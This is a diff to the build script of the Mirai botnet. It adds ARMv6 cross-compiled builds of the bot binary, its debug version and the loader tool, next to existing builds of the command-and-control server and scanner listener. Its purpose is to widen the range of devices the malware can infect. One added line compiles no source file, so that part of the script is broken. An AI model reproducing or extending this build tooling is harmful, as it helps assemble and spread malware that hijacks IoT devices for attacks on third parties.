@@ -25,16 +25,20 @@ elif [ "$1" == "release" ]; then
     rm release/miraint.*
     go build -o release/cnc cnc/*.go
     compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
+    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
 
     compile_bot i586 miraint.x86 "-static"
+    compile_bot armv6l miraint.arm7 "-static"
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
     gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
     gcc -std=c99 tools/badbot.c -g -o debug/badbot
     gcc -std=c99 tools/single_load.c -g -lm -lpthread -w -o debug/single_load
+    armv6l-gcc -std=c99 -g -lm -lpthread -w -o debug/single_load.arm7
     go build -o debug/cnc cnc/*.go
     go build -o debug/scanListen tools/scanListen.go
 else
